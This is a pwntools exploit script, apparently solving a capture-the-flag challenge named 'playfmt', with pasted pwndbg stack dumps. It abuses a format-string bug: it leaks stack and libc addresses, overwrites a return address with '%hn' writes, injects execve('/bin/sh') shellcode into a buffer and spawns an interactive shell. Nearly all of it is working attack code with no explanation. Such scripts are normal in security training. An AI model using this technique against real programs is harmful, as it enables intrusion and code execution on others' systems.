#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.arch = 'i386'
context.os = 'linux'
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

io = process("./playfmt")
elf = ELF("./playfmt")
libc = elf.libc

def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

#  DEBUG("b *0x804853B\nc")
'''
pwndbg> stack 12
00:0000│ esp  0xffd5ce80 —▸ 0x804a060 (buf) ◂— '||%6$p||%8$p||'
01:0004│      0xffd5ce84 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xffd5ce88 ◂— 0x4
03:000c│      0xffd5ce8c —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffd5ce90 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffd5ce94 —▸ 0xf7f61000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
06:0018│ ebp  0xffd5ce98 —▸ 0xffd5cea8 —▸ 0xffd5ceb8 ◂— 0x0
07:001c│      0xffd5ce9c —▸ 0x8048584 (play+59) ◂— nop
08:0020│      0xffd5cea0 —▸ 0xf7f61d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│      0xffd5cea4 ◂— 0x0
0a:0028│      0xffd5cea8 —▸ 0xffd5ceb8 ◂— 0x0
0b:002c│      0xffd5ceac —▸ 0x80485b1 (main+42) ◂— nop
pwndbg>

'''
io.send("||%6$p||%8$p||")
io.recvuntil("||")
playEbp = int(io.recvuntil("||", drop = True), 16)
playRet = playEbp + 0x4
doFmtEbp = playEbp - 0x10
doFmtRet = doFmtEbp + 0x4
success("doFmtEbp -> {:#x}".format(doFmtEbp))
success("doFmtRet -> {:#x}".format(doFmtRet))
success("playEbp -> {:#x}".format(playEbp))
success("playRet -> {:#x}".format(playRet))
libcBase = int(io.recvuntil("||", drop = True), 16) - libc.sym['_IO_2_1_stdout_']
success("libcBase -> {:#x}".format(libcBase))

pause()
payload = "%{}c%6$hn\0".format(playRet & 0xffff)
payload = payload.ljust(16, '\0') + asm(shellcraft.execve('/bin/sh'))
#  DEBUG("b *0x804853B\nc")
io.send(payload)
io.recv()
'''
pwndbg> stack 12
00:0000│ esp  0xfff9b510 —▸ 0x804a060 (buf) ◂— '%46396c%6$hn'
01:0004│      0xfff9b514 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xfff9b518 ◂— 0x4
03:000c│      0xfff9b51c —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xfff9b520 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xfff9b524 —▸ 0xf7ecd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
06:0018│ ebp  0xfff9b528 —▸ 0xfff9b538 —▸ 0xfff9b53c —▸ 0x80485b1 (main+42) ◂— nop
07:001c│      0xfff9b52c —▸ 0x8048584 (play+59) ◂— nop
08:0020│      0xfff9b530 —▸ 0xf7ecdd60 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│      0xfff9b534 ◂— 0x0
0a:0028│      0xfff9b538 —▸ 0xfff9b53c —▸ 0x80485b1 (main+42) ◂— nop
0b:002c│      0xfff9b53c —▸ 0x80485b1 (main+42) ◂— nop
pwndbg>
'''

payload = "%{}c%10$hnn".format(0xa060 + 16) + "\0"
#  DEBUG("b *0x804853B\nc")
io.send(payload)
io.recv()

io.send('quit\0')

io.interactive()
io.close()
